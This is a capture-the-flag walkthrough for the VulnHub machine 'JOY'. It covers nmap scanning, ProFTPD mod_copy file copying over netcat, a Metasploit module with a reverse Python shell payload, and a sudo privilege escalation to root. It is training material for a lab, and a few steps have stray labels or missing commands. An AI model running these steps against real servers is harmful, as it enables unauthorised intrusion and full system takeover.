@@ -1,0 +1,112 @@
+
+
+CTF Walkthrough: DigitalWorld.Local - JOY
+Source: VulnHub - DigitalWorld.Local: JOY
+
+Setup Instructions
+Set the virtual machine in your NAT lab.
+
+1. Reconnaissance (Recon)
+Perform an Nmap scan to identify open ports.
+
+Command Examples:
+
+nmap -sV -v -Pn <host>  
+nmap -sC -A -p- -Pn <host>  
+
+Scan Results:
+
+PORT     STATE SERVICE      VERSION  
+21/tcp   open  ftp          ProFTPD (anonymous login enabled)  
+22/tcp   open  ssh          Dropbear sshd 0.34 (protocol 2.0)  
+25/tcp   open  smtp         Postfix smtpd  
+80/tcp   open  http         Apache httpd 2.4.25  
+110/tcp  open  pop3         Dovecot pop3d  
+139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
+143/tcp  open  imap         Dovecot imapd  
+445/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
+465/tcp  open  smtp         Postfix smtpd  
+587/tcp  open  smtp         Postfix smtpd  
+993/tcp  open  ssl/imaps?  
+995/tcp  open  ssl/pop3s?  
+
+Service Info:  
+- Hosts: The, JOY.localdomain, 127.0.1.1, JOY  
+- OS: Linux  
+- CPE: cpe:/o:linux:linux_kernel  
+
+2. Enumeration
+FTP Enumeration
+FTP allows anonymous login.
+Search for files in the FTP directory for anything useful.
+
+Files Found:
+-rwxrwxr-x 1 ftp ftp 26009 Nov 18 23:06 directory  
+
+File Transfer Example:
+Using netcat (nc) to connect to FTP:
+
+nc <host> 21  
+220 The Good Tech Inc. FTP Server  
+
+site cpfr /home/patrick/version_control  
+350 File or directory exists, ready for destination name  
+
+site cpto /home/ftp/version_control  
+250 Copy successful  
+
+Download the file version_control and analyze its contents.
+
+Exploiting ProFTPD
+ProFTPD allows file copy between directories. Use msfconsole to exploit it.
+
+Steps:
+Search for the ProFTPD exploit:
+bash
+Select and configure the exploit:
+bash
+
+use exploit/unix/ftp/proftpd_modcopy_exec  
+set RHOST <target IP>  
+set RPORT 21  
+set payload cmd/unix/reverse_python  
+exploit  
+
+After successful exploitation, escalate the shell:
+bash
+
+python -c "import pty; pty.spawn('/bin/bash')"  
+3. Privilege Escalation
+FTP Write Privilege Abuse
+Create a malicious file on your local machine:
+
+bash
+
+echo "awk 'BEGIN {system(\"/bin/bash\")}'" > test  
+Upload the file to the FTP server:
+
+bash
+
+ftp <host>  
+put test  
+Use netcat to copy the file to a privileged directory:
+
+bash
+
+nc <host> 21  
+site cpfr /home/ftp/test  
+350 File or directory exists, ready for destination name  
+
+site cpto /home/patrick/script/test  
+250 Copy successful  
+Execute the file with elevated privileges:
+
+bash
+
+sudo /home/patrick/script/test  
+whoami  
+root  
+
+
+Conclusion
+You’ve successfully exploited the target, escalated privileges, and gained root access. Celebrate your achievement and document any additional findings.
